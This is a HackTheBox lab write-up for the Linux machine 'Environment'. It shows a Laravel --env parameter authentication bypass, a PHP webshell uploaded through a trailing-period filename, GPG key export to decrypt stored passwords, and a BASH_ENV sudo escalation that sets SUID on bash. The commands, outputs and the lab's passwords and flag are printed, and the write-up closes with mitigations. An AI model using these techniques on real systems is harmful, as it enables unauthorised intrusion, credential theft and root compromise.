---
categories: HackTheBox
tags: [Environment_Variable, PrivEsc, gpg, File_Upload, Laravel, gnupg]
description: This machine is based on Laravel public exploit vulnerability and gpg password extraction.
media_subpath: /assets/images/
image:
  path: environment.png
  alt: Linux Medium Level Machine 👾
  width: "1200"
  height: "630"
img_path: /assets/images/
---

| Machine Link 🛡️   | [Environment](https://app.hackthebox.com/machines/Environment)        |
| ------------------ | -------------------------------------------- |
| Operating System   | <mark style="background: #FFF3A3A6;">Linux</mark>                                        |
| Difficulty         | <mark style="background: #FFB86CA6;">Medium</mark>                                         |
| Machine Created by | [coopertim13](https://app.hackthebox.com/users/55851) |

---
## 1️⃣ Introduction  

**Vulnerabilities/Concepts:** Laravel Argument Injection (`CVE-2024-52301`), File Upload Bypass (`CVE-2025-27515`), GPG Key Management, BASH_ENV Privilege Escalation  
**Learning Goals:** Understanding modern web framework vulnerabilities, cryptographic key handling, and advanced privilege escalation techniques through environment variable manipulation  
**Ethical Note:** This assessment is conducted in a controlled, authorized laboratory environment for educational purposes only. Unauthorized penetration testing is illegal and unethical.

## 2️⃣ Port Scanning  

**Why:** Port scanning is the foundation of reconnaissance, allowing us to identify open services, running software versions, and potential attack vectors. This information shapes our entire exploitation strategy.

**Commands:**

```bash
sudo nmap -sC -sV -p- -vv -T4 -oN Nmap_Result.txt 10.10.11.67
```
{: .nolineno }

**Flag Breakdown:**
- `-sC`: Executes default NSE (Nmap Scripting Engine) scripts for service detection and vulnerability checks
- `-sV`: Performs version detection on identified services  
- `-p-`: Scans all 65,535 TCP ports (comprehensive coverage vs default 1000 ports)
- `-vv`: Very verbose output for real-time progress monitoring
- `-T4`: Aggressive timing template (faster scans, higher detection risk)
- `-oN`: Outputs results in normal format to specified file

**Scan Results:**
```
PORT      STATE    SERVICE      REASON         VERSION
22/tcp    open     ssh          syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
80/tcp    open     http         syn-ack ttl 63 nginx 1.22.1
```
{: .nolineno }

| Port | Service | Description                                  | Relevance in Pentesting                                         |
| ---- | ------- | -------------------------------------------- | --------------------------------------------------------------- |
| 22   | SSH     | OpenSSH 9.2p1 Debian - Remote administration | Password brute-force, key reuse, credential stuffing            |
| 80   | HTTP    | nginx 1.22.1 - Web server                    | Web vulnerabilities, file upload, XSS, SQLi, framework exploits |

**Notes:** The limited attack surface suggests focus should be on web application security. Alternatives like `masscan` or `rustscan` could provide faster results but less detailed service fingerprinting. Aggressive timing risks triggering IDS/IPS systems in production environments.

## 3️⃣ Web Enumeration  

**Tools:** 
- Web Browser (Manual inspection)
- Host file modification
- Burp Suite (Implicit for request manipulation)

**Content:**
Upon accessing port 80, the browser redirected to `environment.htb`, indicating virtual host routing. This required updating `/etc/hosts`:

```bash
echo "10.10.11.67 environment.htb" >> /etc/hosts
```
{: .nolineno }

![](Pasted%20image%2020250831094013.png)
_Main port 80 site_

Initial reconnaissance revealed a Laravel-based web application with version disclosure. The application exhibited unusual behavior when URL parameters containing `--env=` were provided, suggesting argument injection vulnerabilities.

**Discovery Process:**
- **Framework Identification:** Laravel 11.30.0 detected through error messages and response headers
![](Pasted%20image%2020250831094555.png)
_Environment variable type displayed here_

After tweeking with login form and its values I get this error as I changed the value of remember variable from boolean to decimal number.

![](Pasted%20image%2020250831093941.png)
_After changing the value of remember variable from false to 1 I got this error_

## 4️⃣ Vulnerability Identification  

### Laravel Argument Injection (<b><span style="color:rgb(192, 0, 0)">CVE-2024-52301</span></b> )
- **What it is:** A critical vulnerability allowing attackers to manipulate Laravel's application environment through crafted query parameters, bypassing security controls and accessing restricted functionality.

- **Why the target is vulnerable:** The application runs Laravel 11.30.0, which contains unpatched argument injection flaws in how query parameters are processed by the framework's environment handling mechanisms.

- **Links:** 
  - [laravel-11-30-0-exploit](https://muneebdev.com/laravel-11-30-0-exploit/)
  - [CVE-2024-52301](https://www.cvedetails.com/cve/CVE-2024-52301/)

### Laravel File Upload Bypass (<b><span style="color:rgb(192, 0, 0)">CVE-2025-27515</span></b> )
- **What it is:** A file validation bypass vulnerability in Laravel allowing arbitrary file uploads through filename manipulation techniques.

- **Why the target is vulnerable:** The application's file upload mechanism fails to properly validate file extensions when trailing periods are appended to filenames.

- **Links:**
  - [CVE-2025-27515](https://www.cvedetails.com/cve/CVE-2025-27515/)

## 5️⃣ Exploitation  

**Content:**
The exploitation chain leveraged the argument injection vulnerability to escalate privileges within the web application:

**Step 1: Environment Manipulation**
Testing different environment parameters revealed behavioral changes:
- `?--env=local` - Development environment with debug information
- `?--env=dev` - Development mode with enhanced logging  
- `?--env=preprod` - Pre-production environment with administrative access

Where environment variable `preprod` will direct me to `/management/dashboard` site.

![](Pasted%20image%2020250831095609.png)
_Changed the `/login` to `/login?--env=preprod` and submitted the form_

**Step 2: Authentication Bypass**
By modifying the login request to include `?--env=preprod`, the application granted access to the management dashboard without valid credentials.

I am inside the dashboard site now 🔻

![](Pasted%20image%2020250831095816.png)
_Dashboard site_

**Risks:** This technique demonstrates how parameter pollution can bypass authentication mechanisms in poorly configured web applications.

## 6️⃣ Getting Shell  

**Content:**
Once authenticated to the dashboard, a file upload functionality was discovered and exploited:

**Upload Bypass Technique:**
The application blocked certain file extensions but failed to handle trailing periods correctly. By uploading a file named `command_shell.php.`, the server processed it as a valid PHP file.

![](Pasted%20image%2020250831101119.png)
_File Upload bypass with appending `.` in the filename_

**Shell Establishment:**
The uploaded PHP webshell provided command execution capabilities:

![](Pasted%20image%2020250831101257.png)
_Command execution `id` command_

**Initial Enumeration Results:**

```bash
www-data@environment:/home/hish$ ls -al
total 36
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 .
drwxr-xr-x 3 root root 4096 Jan 12  2025 ..
lrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -> /dev/null
-rw-r--r-- 1 hish hish  220 Jan  6  2025 .bash_logout
-rw-r--r-- 1 hish hish 3526 Jan 12  2025 .bashrc
drwxr-xr-x 4 hish hish 4096 Aug 31 16:26 .gnupg
drwxr-xr-x 3 hish hish 4096 Jan  6  2025 .local
-rw-r--r-- 1 hish hish  807 Jan  6  2025 .profile
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 backup
-rw-r--r-- 1 root hish   33 Aug 31 15:00 user.txt
www-data@environment:/home/hish$ ls -al backup/
total 12
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 .
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 ..
-rw-r--r-- 1 hish hish  430 Aug 31 16:26 keyvault.gpg
www-data@environment:/home/hish$ 
```
{: .nolineno }

The presence of `.gnupg` directory and `backup` folder immediately indicated potential credential storage mechanisms.

## 7️⃣ Post-Exploitation Enumeration  

**Content:**

- **GPG Key Discovery:** Located `.gnupg` directory containing cryptographic keys and `backup/keyvault.gpg` encrypted file
- **File System Analysis:** Identified user directories and permission structures
- **Credential Hunting:** Focused on encrypted data that might contain authentication materials

**GPG Decryption Process:**

1. **List Public Keys**
```bash
gpg --homedir ./.gnupg --list-keys
```
{: .nolineno }

*Purpose: Verify available encryption keys in the custom keyring*

2. **List Private Keys**  
```bash
gpg --homedir ./.gnupg --list-secret-keys
```
{: .nolineno }

*Purpose: Confirm decryption keys exist in the keyring*

3. **Export Private Key**
```bash
gpg --homedir ./.gnupg --export-secret-keys -a > private_key.asc
```
{: .nolineno }

*Purpose: Extract keys for import into standard GPG environment*

4. **Import Private Key**
```bash
gpg --import private_key.asc
```
{: .nolineno }

*Purpose: Make keys available for standard GPG operations*

5. **Decrypt Vault**
```bash
gpg --decrypt keyvault.gpg
```
{: .nolineno }

- **What it does**: Decrypts `keyvault.gpg` using imported keys
- **Purpose**: Access encrypted content.

Output: 

```bash
└─$ sudo gpg --homedir ./.gnupg --list-keys
sudo gpg --homedir ./.gnupg --list-secret-keys
sudo gpg --homedir ./.gnupg --export-secret-keys -a > private_key.asc
sudo gpg --import private_key.asc
sudo gpg --decrypt keyvault.gpg
[sudo] password for kali: 
gpg: WARNING: unsafe ownership on homedir '/home/kali/Downloads/HTB/Environment/./.gnupg'
/home/kali/Downloads/HTB/Environment/./.gnupg/pubring.kbx
---------------------------------------------------------
pub   rsa2048 2025-01-11 [SC]
      F45830DFB638E66CD8B752A012F42AE5117FFD8E
uid           [ultimate] hish_ <hish@environment.htb>
sub   rsa2048 2025-01-11 [E]

gpg: WARNING: unsafe ownership on homedir '/home/kali/Downloads/HTB/Environment/./.gnupg'
/home/kali/Downloads/HTB/Environment/./.gnupg/pubring.kbx
---------------------------------------------------------
sec   rsa2048 2025-01-11 [SC]
      F45830DFB638E66CD8B752A012F42AE5117FFD8E
uid           [ultimate] hish_ <hish@environment.htb>
ssb   rsa2048 2025-01-11 [E]

gpg: WARNING: unsafe ownership on homedir '/home/kali/Downloads/HTB/Environment/./.gnupg'
gpg: directory '/root/.gnupg' created
gpg: keybox '/root/.gnupg/pubring.kbx' created
gpg: /root/.gnupg/trustdb.gpg: trustdb created
gpg: key 12F42AE5117FFD8E: public key "hish_ <hish@environment.htb>" imported
gpg: key 12F42AE5117FFD8E: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
gpg: encrypted with rsa2048 key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```
{: .nolineno }

**Decryption Results:**
```
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```
{: .nolineno }

**Privesc Paths:**
- User credential reuse (successful with `hish` password)
- Sudo privilege analysis
- SUID binary identification

## 8️⃣ Privilege Escalation  

Change the user to <b><span style="color:rgb(219, 0, 0)">hish</span></b> user 🔻

```bash
www-data@environment:/home/hish/.gnupg$ su hish
Password: 
hish@environment:~/.gnupg$ whoami
hish
hish@environment:~/.gnupg$ id
uid=1000(hish) gid=1000(hish) groups=1000(hish),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth)
hish@environment:~/.gnupg$
```
{: .nolineno }

**Method Used:** BASH_ENV Environment Variable Injection

**Why this vector:** The `sudo -l` output revealed a critical misconfiguration:

```bash
sudo -l
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin, 
    env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```
{: .nolineno }

**Technical Analysis:**
- `secure_path` prevents PATH manipulation attacks
- `env_keep+="ENV BASH_ENV"` allows BASH_ENV persistence through sudo
- `/usr/bin/systeminfo` is a bash script, making it vulnerable to BASH_ENV injection

**Commands and Steps:**

Content of `systeminfo` file 🔻

```bash
hish@environment:/tmp$ cat /usr/bin/systeminfo
#!/bin/bash
echo -e "\n### Displaying kernel ring buffer logs (dmesg) ###"
dmesg | tail -n 10

echo -e "\n### Checking system-wide open ports ###"
ss -antlp

echo -e "\n### Displaying information about all mounted filesystems ###"
mount | column -t

echo -e "\n### Checking system resource limits ###"
ulimit -a

echo -e "\n### Displaying loaded kernel modules ###"
lsmod | head -n 10

echo -e "\n### Checking disk usage for all filesystems ###"
df -h
hish@environment:/tmp$ ls -al /usr/bin/systeminfo
-rwxr-xr-x 1 root root 452 Jan 12  2025 /usr/bin/systeminfo
hish@environment:/tmp$ 
```
{: .nolineno }

The sudoers entry has `secure_path` set, which resets the PATH to a safe one. But note: the `env_keep` does not include PATH, so the PATH will be reset to the secure_path. Therefore, we cannot manipulate PATH.

But wait: the `env_keep` includes `BASH_ENV`. We can set `BASH_ENV` to a file that contains commands we want to run. When the bash script starts, it will source the file pointed to by `BASH_ENV` (if it is set). 

This is because the script starts with `#!/bin/bash`, and bash sources the file named by `BASH_ENV` when it starts in non-interactive mode.

So the plan is:

1. Create a file (e.g., in /tmp) that contains a command to escalate privileges (like spawning a shell).
2. Set the `BASH_ENV` environment variable to point to that file.
3. Run `sudo /usr/bin/systeminfo`. The script will source our file, and we get a root shell.

I will be using SUID permission on bash with this script🔻

```bash
hish@environment:/tmp$ echo "chmod u+s /bin/bash" > script.sh
hish@environment:/tmp$ chmod +x script.sh
```
{: .nolineno }

 I will set the variable now to this file `script.sh`.

```bash
hish@environment:/tmp$ export BASH_ENV=/tmp/script.sh
```
{: .nolineno }

Now I will run the sudoer binary file now 🔽

```bash
hish@environment:/tmp$ sudo /usr/bin/systeminfo
```
{: .nolineno }

## 9️⃣ Root Access  

**Getting Root Shell:**

Resulting I got the SUID permission on bash 🔻

```bash
hish@environment:/tmp$ ls -al /bin/bash
-rwsr-xr-x 1 root root 1265648 Mar 30  2024 /bin/bash
hish@environment:/tmp$ bash -p
bash-5.2# cd /root
bash-5.2# whoami
root
bash-5.2# id
uid=1000(hish) gid=1000(hish) euid=0(root) groups=1000(hish),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth)
bash-5.2# hostname
environment
bash-5.2# ls -al
total 44
drwx------  6 root root 4096 Aug 31 15:00 .
drwxr-xr-x 18 root root 4096 Apr 30 00:31 ..
lrwxrwxrwx  1 root root    9 Apr  7 19:29 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 11  2021 .bashrc
drwx------  3 root root 4096 Jan 12  2025 .config
-rw-------  1 root root   20 Apr  7 20:34 .lesshst
drwxr-xr-x  3 root root 4096 Jan  8  2025 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   33 Aug 31 15:00 root.txt
drwxr-xr-x  2 root root 4096 Apr 11 00:55 scripts
-rw-r--r--  1 root root   66 Jan 12  2025 .selected_editor
drwx------  2 root root 4096 Jan  6  2025 .ssh
bash-5.2# cat root.txt
5f56125f0513a30e911d936866cfd4ac
bash-5.2# 
```
{: .nolineno }

I am root now !

___

## 🔍 Mitigation  

✅ **Update Laravel Framework** to version 11.31.0+ to patch CVE-2024-52301 argument injection vulnerability<br>
✅ **Implement Strict File Upload Validation** using whitelist approaches, MIME type verification, and filename sanitization<br>  
✅ **Remove BASH_ENV from sudo env_keep** or implement strict script validation for privileged operations<br>
✅ **Encrypt Sensitive Data** with proper key management instead of storing credentials in accessible locations<br>
✅ **Apply Principle of Least Privilege** to sudo configurations and file system permissions<br>
✅ **Implement Web Application Firewall (WAF)** rules to detect parameter manipulation attempts

## 💡 Takeaways  

✅ **Framework-Specific Vulnerabilities** require staying current with security advisories and patch cycles for web frameworks like Laravel<br>
✅ **Environment Variable Attacks** demonstrate the importance of understanding how applications handle configuration and runtime parameters<br>
✅ **GPG Key Management** in penetration testing showcases how cryptographic implementations can become attack vectors when improperly secured<br>  
✅ **Sudo Misconfiguration** remains a prevalent privilege escalation vector, particularly with environment variable inheritance<br>
✅ **Defense in Depth** is crucial - multiple vulnerabilities chained together created a complete compromise path

## 📌 References  

- [Laravel 11.30.0 Exploit Guide](https://muneebdev.com/laravel-11-30-0-exploit/)
- [CVE-2024-52301 Details](https://www.cvedetails.com/cve/CVE-2024-52301/)
- [CVE-2025-27515 Details](https://www.cvedetails.com/cve/CVE-2025-27515/)
- [GPG Documentation](https://gnupg.org/documentation/)
- [Sudo Security Best Practices](https://sudo.ws/security/advisories/)



---

> _If you have any questions or suggestions, please leave a comment below or DM me on [Twitter](https://twitter.com/StrongShiv8). Thank you!_
{: .prompt-tip }

___
